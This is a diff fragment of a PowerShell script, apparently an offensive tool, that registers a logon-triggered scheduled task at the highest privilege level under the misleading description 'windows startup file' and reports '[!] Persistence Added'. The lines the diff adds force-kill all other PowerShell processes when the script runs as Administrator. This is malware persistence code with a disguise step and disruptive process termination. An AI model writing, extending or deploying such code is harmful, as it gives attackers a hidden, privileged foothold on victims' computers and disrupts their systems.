@@ -53,6 +53,10 @@ $task_trigger = New-ScheduledTaskTrigger -AtLogOn
 $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
 Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "windows startup file" -RunLevel Highest -Force
 
+if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    $currentPid = $pid
+    Get-Process -Name powershell | Where-Object { $_.Id -ne $currentPid } | ForEach-Object { Stop-Process -Id $_.Id -Force }
+}
 
 Write-Host "[!] Persistence Added" -ForegroundColor Green
 
